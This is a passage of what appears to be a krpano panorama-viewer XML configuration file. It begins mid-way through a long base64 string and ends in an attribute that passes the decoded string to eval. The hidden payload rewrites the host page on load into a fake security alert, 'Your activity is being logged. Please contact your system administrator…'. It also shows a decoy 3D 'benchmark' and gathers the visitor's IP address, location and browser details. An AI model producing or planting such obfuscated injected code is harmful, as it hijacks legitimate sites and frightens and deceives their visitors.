9IE1JTl9DVUJFUzsNCiAgICAgICAgICAgICAgICBjb25zdCBzcHJlYWQgPSA4Ow0KDQogICAgICAgICAgICAgICAgY29uc29sZS5sb2coXGBDcmVhdGluZyBcJHt0b3RhbFBvdGVudGlhbEN1YmVzfSB0b3RhbCBjdWJlcywgc3RhcnRpbmcgd2l0aCBcJHtpbml0aWFsQWN0aXZlQ291bnR9IGFjdGl2ZS4uLlxgKTsNCg0KICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgdG90YWxQb3RlbnRpYWxDdWJlczsgaSsrKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGdlb21ldHJ5ID0gbmV3IFRIUkVFLkJveEdlb21ldHJ5KDAuMTUsIDAuMTUsIDAuMTUpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtYXRlcmlhbCA9IG5ldyBUSFJFRS5NZXNoU3RhbmRhcmRNYXRlcmlhbCh7DQogICAgICAgICAgICAgICAgICAgICAgICAgY29sb3I6IE1hdGgucmFuZG9tKCkgKiAweGZmZmZmZiwNCiAgICAgICAgICAgICAgICAgICAgICAgICByb3VnaG5lc3M6IDAuNSwgbWV0YWxuZXNzOiAwLjINCiAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGN1YmUgPSBuZXcgVEhSRUUuTWVzaChnZW9tZXRyeSwgbWF0ZXJpYWwpOw0KICAgICAgICAgICAgICAgICAgICBjdWJlLnBvc2l0aW9uLnggPSAoTWF0aC5yYW5kb20oKSAtIDAuNSkgKiBzcHJlYWQ7DQogICAgICAgICAgICAgICAgICAgIGN1YmUucG9zaXRpb24ueSA9IChNYXRoLnJhbmRvbSgpIC0gMC41KSAqIHNwcmVhZDsNCiAgICAgICAgICAgICAgICAgICAgY3ViZS5wb3NpdGlvbi56ID0gKE1hdGgucmFuZG9tKCkgLSAwLjUpICogc3ByZWFkOw0KICAgICAgICAgICAgICAgICAgICBjdWJlLnJvdGF0aW9uLnggPSBNYXRoLnJhbmRvbSgpICogTWF0aC5QSSAqIDI7DQogICAgICAgICAgICAgICAgICAgIGN1YmUucm90YXRpb24ueSA9IE1hdGgucmFuZG9tKCkgKiBNYXRoLlBJICogMjsNCiAgICAgICAgICAgICAgICAgICAgY3ViZS5yb3RhdGlvbi56ID0gTWF0aC5yYW5kb20oKSAqIE1hdGguUEkgKiAyOw0KICAgICAgICAgICAgICAgICAgICBjdWJlLnVzZXJEYXRhLnJvdGF0aW9uU3BlZWQgPSB7DQogICAgICAgICAgICAgICAgICAgICAgICB4OiAoTWF0aC5yYW5kb20oKSAtIDAuNSkgKiAwLjAyLA0KICAgICAgICAgICAgICAgICAgICAgICAgeTogKE1hdGgucmFuZG9tKCkgLSAwLjUpICogMC4wMiwNCiAgICAgICAgICAgICAgICAgICAgICAgIHo6IChNYXRoLnJhbmRvbSgpIC0gMC41KSAqIDAuMDINCiAgICAgICAgICAgICAgICAgICAgfTsNCg0KICAgICAgICAgICAgICAgICAgICBpZiAoaSA8IGluaXRpYWxBY3RpdmVDb3VudCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgc2NlbmUuYWRkKGN1YmUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgYWN0aXZlQ3ViZXMucHVzaChjdWJlKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGluYWN0aXZlQ3ViZXMucHVzaChjdWJlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhcYEZpbmlzaGVkIGNyZWF0aW5nLiBBY3RpdmU6IFwke2FjdGl2ZUN1YmVzLmxlbmd0aH0sIEluYWN0aXZlOiBcJHtpbmFjdGl2ZUN1YmVzLmxlbmd0aH1cYCk7DQoNCiAgICAgICAgICAgICAgICBjYW1lcmEucG9zaXRpb24uc2V0KDAsIDAsIGNhbWVyYVN0YXJ0Wik7DQoNCiAgICAgICAgICAgICAgICBzdGF0cyA9IG5ldyBTdGF0cygpOw0KICAgICAgICAgICAgICAgIHN0YXRzLnNob3dQYW5lbCgwKTsNCiAgICAgICAgICAgICAgICBzdGF0cy5kb20uaWQgPSAnc3RhdHMnOw0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc3RhdHMuZG9tKTsNCg0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ21vdXNlbW92ZScsIG9uRG9jdW1lbnRNb3VzZU1vdmUsIGZhbHNlKTsNCg0KICAgICAgICAgICAgICAgIGxhc3RGcmFtZVRpbWUgPSBwZXJmb3JtYW5jZS5ub3coKTsNCiAgICAgICAgICAgICAgICBzbW9vdGhlZEZQUyA9IFRBUkdFVF9GUFM7DQogICAgICAgICAgICAgICAgbGFzdEFkanVzdG1lbnRUaW1lID0gcGVyZm9ybWFuY2Uubm93KCk7DQoNCiAgICAgICAgICAgICAgICBzdGFydEFuaW1hdGlvbigpOw0KDQogICAgICAgICAgICB9IGNhdGNoKGUpIHsNCiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJGQVRBTDogRXJyb3Igc2V0dGluZyB1cCBUaHJlZS5qcyBzY2VuZToiLCBlKTsNCiAgICAgICAgICAgICAgICBiZW5jaG1hcmtDYW52YXMuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgICAgICBmcHNJbmZvRWxlbWVudC50ZXh0Q29udGVudCA9ICJFcnJvciBsb2FkaW5nIGdyYXBoaWNzIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIC8vIC0tLSBBbmltYXRpb24gTG9vcCAtLS0NCiAgICAgICAgIGZ1bmN0aW9uIHN0YXJ0QW5pbWF0aW9uKCkgew0KICAgICAgICAgICAgIGlmIChhbmltYXRpb25GcmFtZUlkKSB7DQogICAgICAgICAgICAgICAgIGNhbmNlbEFuaW1hdGlvbkZyYW1lKGFuaW1hdGlvbkZyYW1lSWQpOw0KICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICBjb25zb2xlLmxvZygiU3RhcnRpbmcgYW5pbWF0aW9uIGxvb3AuLi4iKTsNCiAgICAgICAgICAgICBhbmltYXRlKCk7DQogICAgICAgICB9DQoNCiAgICAgICAgZnVuY3Rpb24gYW5pbWF0ZSgpIHsNCiAgICAgICAgICAgIGFuaW1hdGlvbkZyYW1lSWQgPSByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoYW5pbWF0ZSk7DQoNCiAgICAgICAgICAgIHN0YXRzLmJlZ2luKCk7DQoNCiAgICAgICAgICAgIGNhbGN1bGF0ZUFuZFVwZGF0ZUZQUygpOw0KDQogICAgICAgICAgICBhY3RpdmVDdWJlcy5mb3JFYWNoKGN1YmUgPT4gew0KICAgICAgICAgICAgICAgICBpZiAoY3ViZSAmJiBjdWJlLnVzZXJEYXRhLnJvdGF0aW9uU3BlZWQpIHsNCiAgICAgICAgICAgICAgICAgICAgY3ViZS5yb3RhdGlvbi54ICs9IGN1YmUudXNlckRhdGEucm90YXRpb25TcGVlZC54Ow0KICAgICAgICAgICAgICAgICAgICBjdWJlLnJvdGF0aW9uLnkgKz0gY3ViZS51c2VyRGF0YS5yb3RhdGlvblNwZWVkLnk7DQogICAgICAgICAgICAgICAgICAgIGN1YmUucm90YXRpb24ueiArPSBjdWJlLnVzZXJEYXRhLnJvdGF0aW9uU3BlZWQuejsNCiAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSk7DQoNCiAgICAgICAgICAgIGNhbWVyYS5wb3NpdGlvbi54ICs9ICh0YXJnZXRYIC0gY2FtZXJhLnBvc2l0aW9uLngpICogY2FtZXJhU21vb3RoaW5nRmFjdG9yOw0KICAgICAgICAgICAgY2FtZXJhLnBvc2l0aW9uLnkgKz0gKHRhcmdldFkgLSBjYW1lcmEucG9zaXRpb24ueSkgKiBjYW1lcmFTbW9vdGhpbmdGYWN0b3I7DQogICAgICAgICAgICBjYW1lcmEubG9va0F0KHNjZW5lLnBvc2l0aW9uKTsNCg0KICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgIGlmIChyZW5kZXJlciAmJiBzY2VuZSAmJiBjYW1lcmEpIHsNCiAgICAgICAgICAgICAgICAgICAgcmVuZGVyZXIucmVuZGVyKHNjZW5lLCBjYW1lcmEpOw0KICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBkdXJpbmcgcmVuZGVyaW5nOiIsIGUpOw0KICAgICAgICAgICAgICAgICBzdG9wQW5pbWF0aW9uc0FuZFRpbWVycygpOw0KICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgc3RhdHMuZW5kKCk7DQogICAgICAgIH0NCg0KICAgICAgICAvLyAtLS0gV2luZG93IFJlc2l6ZSAtLS0NCiAgICAgICAgZnVuY3Rpb24gb25XaW5kb3dSZXNpemUoKSB7DQogICAgICAgICAgICB3aW5kb3dIYWxmWCA9IHdpbmRvdy5pbm5lcldpZHRoIC8gMjsNCiAgICAgICAgICAgIHdpbmRvd0hhbGZZID0gd2luZG93LmlubmVySGVpZ2h0IC8gMjsNCiAgICAgICAgICAgIGlmIChjYW1lcmEgJiYgcmVuZGVyZXIgJiYgYmVuY2htYXJrQ2FudmFzICYmIGJlbmNobWFya0NhbnZhcy5vZmZzZXRXaWR0aCA+IDAgJiYgYmVuY2htYXJrQ2FudmFzLm9mZnNldEhlaWdodCA+IDApIHsNCiAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgY2FtZXJhLmFzcGVjdCA9IGJlbmNobWFya0NhbnZhcy5vZmZzZXRXaWR0aCAvIGJlbmNobWFya0NhbnZhcy5vZmZzZXRIZWlnaHQ7DQogICAgICAgICAgICAgICAgICAgIGNhbWVyYS51cGRhdGVQcm9qZWN0aW9uTWF0cml4KCk7DQogICAgICAgICAgICAgICAgICAgIHJlbmRlcmVyLnNldFNpemUoYmVuY2htYXJrQ2FudmFzLm9mZnNldFdpZHRoLCBiZW5jaG1hcmtDYW52YXMub2Zmc2V0SGVpZ2h0KTsNCiAgICAgICAgICAgICAgICAgfSBjYXRjaChlKSB7DQogICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciByZXNpemluZyByZW5kZXJlci9jYW1lcmE6IiwgZSk7DQogICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigncmVzaXplJywgb25XaW5kb3dSZXNpemUpOw0KDQogICAgICAgIC8vIC0tLSBUeXBpbmcgRWZmZWN0IC0tLQ0KICAgICAgICBsZXQgdHlwZUludGVydmFsSWQgPSBudWxsOw0KICAgICAgICBsZXQgY2hhckluZGV4ID0gMDsNCiAgICAgICAgY29uc3Qgb3JpZ2luYWxXYXJuaW5nVGV4dCA9ICJZb3VyIGFjdGl2aXR5IGlzIGJlaW5nIGxvZ2dlZC4gUGxlYXNlIGNvbnRhY3QgeW91ciBzeXN0ZW0gYWRtaW5pc3RyYXRvciBpbW1lZGlhdGVseS4gVW5hdXRob3JpemVkIGFjY2VzcyBpcyBzdHJpY3RseSBwcm9oaWJpdGVkIGFuZCBtYXkgcmVzdWx0IGluIHNldmVyZSBwZW5hbHRpZXMuIEFsbCBhY3Rpb25zIGFyZSBtb25pdG9yZWQgYW5kIHJlY29yZGVkIGZvciBzZWN1cml0eSBwdXJwb3Nlcy4gQ29udGludWVkIGF0dGVtcHRzIHRvIGFjY2VzcyB0aGlzIHN5c3RlbSB3aXRob3V0IGF1dGhvcml6YXRpb24gd2lsbCBiZSB0cmVhdGVkIGFzIGEgc2VyaW91cyBzZWN1cml0eSBicmVhY2guIjsNCg0KICAgICAgICBmdW5jdGlvbiB0eXBlV3JpdGVyKCkgew0KICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHR5cGVJbnRlcnZhbElkKTsNCiAgICAgICAgICAgIGlmIChjaGFySW5kZXggPCBvcmlnaW5hbFdhcm5pbmdUZXh0Lmxlbmd0aCkgew0KICAgICAgICAgICAgICAgIHdhcm5pbmdNZXNzYWdlRWxlbWVudC50ZXh0Q29udGVudCArPSBvcmlnaW5hbFdhcm5pbmdUZXh0LmNoYXJBdChjaGFySW5kZXgpOw0KICAgICAgICAgICAgICAgIGNoYXJJbmRleCsrOw0KICAgICAgICAgICAgICAgIHdhcm5pbmdNZXNzYWdlRWxlbWVudC5zY3JvbGxUb3AgPSB3YXJuaW5nTWVzc2FnZUVsZW1lbnQuc2Nyb2xsSGVpZ2h0Ow0KICAgICAgICAgICAgICAgIHR5cGVJbnRlcnZhbElkID0gc2V0VGltZW91dCh0eXBlV3JpdGVyLCAzMCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBmdW5jdGlvbiByZXNldEFuZFN0YXJ0VHlwaW5nKCkgew0KICAgICAgICAgICAgIGNsZWFyVGltZW91dCh0eXBlSW50ZXJ2YWxJZCk7DQogICAgICAgICAgICAgd2FybmluZ01lc3NhZ2VFbGVtZW50LnRleHRDb250ZW50ID0gJyc7DQogICAgICAgICAgICAgd2FybmluZ01lc3NhZ2VFbGVtZW50LnNjcm9sbFRvcCA9IDA7DQogICAgICAgICAgICAgY2hhckluZGV4ID0gMDsNCiAgICAgICAgICAgICB0eXBlV3JpdGVyKCk7DQogICAgICAgIH0NCg0KICAgICAgICAvLyAtLS0gU3RvcC9DbGVhbnVwIC0tLQ0KICAgICAgICBmdW5jdGlvbiBzdG9wQW5pbWF0aW9uc0FuZFRpbWVycygpIHsNCiAgICAgICAgICAgICBjb25zb2xlLmxvZygiU3RvcHBpbmcgYW5pbWF0aW9ucyBhbmQgdGltZXJzLi4uIik7DQogICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHR5cGVJbnRlcnZhbElkKTsNCiAgICAgICAgICAgICBpZiAoYW5pbWF0aW9uRnJhbWVJZCkgew0KICAgICAgICAgICAgICAgIGNhbmNlbEFuaW1hdGlvbkZyYW1lKGFuaW1hdGlvbkZyYW1lSWQpOw0KICAgICAgICAgICAgICAgIGFuaW1hdGlvbkZyYW1lSWQgPSBudWxsOw0KICAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIC8vIC0tLSBJbml0aWFsaXphdGlvbiAtLS0NCiAgICAgICAgLy8gd2luZG93Lm9ubG9hZCDsgqzsmqk6IGRvY3VtZW50LndyaXRl66GcIOyDiOuhnCDsk7Dsnbgg66y47ISc6rCAIOyZhOyghO2eiCDroZzrk5zrkJwg7ZuEIOyLpO2WieuQqeuLiOuLpC4NCiAgICAgICAgd2luZG93Lm9ubG9hZCA9ICgpID0+IHsNCiAgICAgICAgICAgIGNvbnNvbGUubG9nKCJXaW5kb3cgbG9hZGVkIChmcm9tIHdyaXR0ZW4gSFRNTCkuIEluaXRpYWxpemluZy4uLiIpOw0KICAgICAgICAgICAgd2luZG93SGFsZlggPSB3aW5kb3cuaW5uZXJXaWR0aCAvIDI7DQogICAgICAgICAgICB3aW5kb3dIYWxmWSA9IHdpbmRvdy5pbm5lckhlaWdodCAvIDI7DQoNCiAgICAgICAgICAgIGZldGNoQW5kRGlzcGxheUlQQW5kTG9jYXRpb24oKTsNCiAgICAgICAgICAgIGRpc3BsYXlCcm93c2VyQW5kUGxhdGZvcm1JbmZvKCk7DQogICAgICAgICAgICBhZGRQZXJmb3JtYW5jZUJlbmNobWFyaygpOyAvLyBTZXR1cCBUaHJlZS5qcyBzY2VuZSBhbmQgc3RhcnQgYW5pbWF0aW9uDQogICAgICAgICAgICByZXNldEFuZFN0YXJ0VHlwaW5nKCk7IC8vIFN0YXJ0IHRoZSB0eXBpbmcgZWZmZWN0DQogICAgICAgIH07DQoNCiAgICAgICAgLy8gLS0tIFN5c3RlbSBSZXNldCAtLS0NCiAgICAgICAgc3lzdGVtUmVzZXRCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgICAgICAgICBjb25zb2xlLmxvZygiU3lzdGVtIHJlc2V0IHJlcXVlc3RlZC4iKTsNCiAgICAgICAgICAgIHN0b3BBbmltYXRpb25zQW5kVHRpbWVycygpOyAvLyDsmKTtg4Ag7IiY7KCVOiBUaW1lcnMNCiAgICAgICAgICAgIGxvY2F0aW9uLnJlbG9hZCgpOw0KICAgICAgICB9KTsNCg0KICAgICAgICAvLyAtLS0gVW5sb2FkIENsZWFudXAgLS0tDQogICAgICAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignYmVmb3JldW5sb2FkJywgc3RvcEFuaW1hdGlvbnNBbmRUaW1lcnMpOw0KDQogICAgPC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+DQpgOyAvLyDthZztlIzrpr8g66as7YSw65+0IOuBnQ0KDQovLyDtmITsnqwg66y47ISc66W8IOyXtOqzoCDsnITsl5DshJwg7KCV7J2Y7ZWcIEhUTUwg7L2U65Oc66GcIOuNruyWtOyUgeuLiOuLpC4NCmRvY3VtZW50Lm9wZW4oKTsNCmRvY3VtZW50LndyaXRlKGh0bWxDb2RlKTsNCmRvY3VtZW50LmNsb3NlKCk7IC8vIOusuOyEnCDsk7DquLAg7JmE66OM');eval(w)););" />
</krpano>
